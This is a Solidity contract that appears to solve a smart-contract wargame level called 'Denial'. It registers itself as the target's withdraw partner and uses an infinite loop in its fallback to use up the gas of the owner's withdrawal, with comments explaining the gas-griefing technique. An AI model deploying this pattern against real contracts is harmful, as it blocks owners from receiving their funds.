// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Denial.sol';

contract HackDenial {
  // Complete with the instance's address
  Denial public originalContract = Denial(payable(0xD80Da85210307030dc3Da7FfF7533dBDE782C2AE)); 

  function setPartner() public {
    // We're gonna set the partner to be this contract
    originalContract.setWithdrawPartner(address(this));
  }

  fallback() external payable {
    // When the owner calls the withdrawn function, it's going to make a call to this contract.
    // This is because it's the partner.
    // When someone uses the call function if they run out of gas it's NOT going to revert the tx.
    // If we use other way to send money, like transfer, it will certanly revert if we run out of gas.
    // Making this while statement, we're going to make that the owner run out of gas.
    // This way we receive the ether but the owner doesn't because there is no more gas left.
     while (true) {}
  }
}